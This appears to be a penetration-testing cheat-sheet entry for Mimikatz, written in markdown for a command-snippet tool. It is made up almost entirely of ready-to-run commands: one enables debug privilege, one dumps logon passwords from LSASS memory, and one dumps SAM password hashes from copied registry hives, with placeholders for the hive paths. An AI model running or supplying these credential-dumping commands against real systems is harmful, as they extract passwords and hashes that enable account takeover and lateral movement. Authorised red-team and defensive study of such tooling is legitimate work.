---
tool: Mimikatz
category: windows-tool
tags: windows tool mimikatz credentials sekurlsa lsadump
---

# Mimikatz

Mimikatz extracts credential material from LSASS, registry hives, Kerberos tickets, and Windows authentication packages.

## Windows

### Privilege debug

#cmd #mimikatz

Enable debug privilege inside Mimikatz.

```cmd title:"Enable Mimikatz debug privilege"
mimikatz.exe "privilege::debug" "exit"
```
<!-- cheat -->

### Logon passwords

#cmd #mimikatz #lsass

Dump logon credentials from LSASS.

```cmd title:"Dump logon passwords with Mimikatz"
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
<!-- cheat -->

### SAM from hives

#cmd #mimikatz #sam

Dump SAM hashes from copied registry hives.

```cmd title:"Dump SAM hashes from hives"
mimikatz.exe "lsadump::sam /system:$system_hive /sam:$sam_hive" "exit"
```
<!-- cheat
var system_hive
var sam_hive
-->
